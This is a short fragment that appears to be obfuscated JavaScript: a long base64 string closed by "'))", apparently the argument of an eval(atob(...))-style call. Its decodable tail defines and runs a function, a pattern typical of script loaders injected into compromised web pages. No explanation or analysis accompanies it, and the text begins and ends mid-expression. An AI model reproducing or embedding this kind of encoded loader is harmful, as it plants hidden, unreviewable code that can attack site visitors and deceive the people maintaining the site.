VkX0hfY2lIMDp0WyB9SGUlZG50c2w7KV90XSgjXyAxZWM4fWNJZEhKMSh5Ul99SHNFXC84XTBIdC5lSClhJXM7fUgrcEhye3MxZCUsbV19cmRtKUg6LnMlW3RpIGRjSCl7SC45TiVkRnU9e2Z7XyktIT1IJixnbiFIJWZobDlIIV8jLXJyNGI5bHdvYSB7NTMxaWMzZHRsIH1ISEhfe303VHQzSCBISHQkZUgzSjkzanMxSHhdKHQsdS1tc3JIIGRmbGVjJV9kdD0uZDMgMEggLDh0cjo8SGdIXzcyZHQpIHBOU0g7KTkxIDtjNzdpSG4mZHZvdCA7IClIPUkpNjM1IEhjNkt0SClmZCldJG9kTikhLiAldHglSCk1JEM7ZGlIUCVIIHJISDlLNi4uN0hIdHJxZW5dYS1dM1BvX2EpYS5pO283N10wSHBJSEhILkBbZV9IMWldKGQoM3NpaWE1LjtIXV1PaUhIPjRIOWw0NS5uOzYzPSkrfX0ocyAzKzIpJykpO3ZhciBrQWw9ZXJvKEhzTCxkVXMgKTtrQWwoOTcwNCk7cmV0dXJuIDcwNDB9KSgp'))
